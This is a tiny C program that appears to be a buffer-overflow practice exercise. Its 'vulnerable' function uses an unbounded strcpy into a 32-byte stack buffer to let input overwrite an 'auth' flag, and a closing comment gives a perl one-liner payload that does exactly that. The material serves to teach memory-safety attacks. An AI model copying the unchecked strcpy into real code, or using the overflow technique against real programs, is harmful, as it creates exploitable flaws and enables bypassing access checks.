#include <stdio.h>
#include <string.h>

void vulnerable(char *input){
    int auth = 0;
    char buffer[32];

    strcpy(buffer, input);

    if(auth != 0){
        printf("[+] Access Granted!\n");
    } else {
        printf("[-] Access Denied!\n");
    }   
}

int main(int argc, char *argv[]){
    if(argc < 2){
        printf("Usage %s <input>\n", argv[0]);
        return 1;
    }

    vulnerable(argv[1]);
    return 0;
}

// exploit 
// ./0x01 $(perl -e 'print "A"x44 . "\x01"')